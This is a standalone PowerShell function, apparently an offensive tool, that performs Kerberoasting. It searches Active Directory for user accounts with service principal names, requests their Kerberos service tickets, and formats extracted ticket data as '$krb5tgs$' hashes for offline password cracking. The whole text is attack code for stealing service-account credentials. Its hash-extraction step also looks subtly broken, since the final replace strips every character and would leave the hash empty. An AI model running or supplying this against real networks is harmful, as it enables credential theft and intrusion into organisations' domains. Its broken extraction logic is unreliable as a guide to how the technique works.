function Get-Kerberoast {
    $searcher = [adsisearcher]"(&(servicePrincipalName=*)(samAccountType=805306368))"
    $searcher.PropertiesToLoad.AddRange(@('samaccountname','distinguishedname','serviceprincipalname')) | Out-Null
    
    $users = $searcher.FindAll() | ForEach-Object {
        [PSCustomObject]@{
            SamAccountName = $_.Properties.samaccountname[0]
            SPN = $_.Properties.serviceprincipalname[0]
        }
    }
    
    $users | Where-Object SamAccountName -ne 'krbtgt' | ForEach-Object {
        try {
            $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.SPN
            $hash = ([BitConverter]::ToString($ticket.GetRequest()).Replace('-','') -split 'A382....3082....A0030201..A1....A282....')[1].Substring(0,68) -replace '..',''
            "`$krb5tgs`$$($_.SPN):$hash"
        }
        catch { }
    }
}
